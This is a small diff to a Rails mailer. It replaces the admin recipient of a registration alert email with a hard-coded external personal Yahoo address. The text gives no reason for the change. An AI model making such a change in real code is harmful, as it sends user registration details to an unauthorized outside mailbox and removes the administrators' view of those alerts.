@@ -92,7 +92,7 @@ class UserMailer < ApplicationMailer
       # html +="Username."
       @content = html
       @subject = user.role.upcase + " EMAIL ALERT REGISTRATION"
-      mail(from: AdminUser.first.email,to: AdminUser.first.email, subject: @subject)
+      mail(from: AdminUser.first.email,to: 'tigmicheal@yahoo.co.uk', subject: @subject)
     end
   end
 end
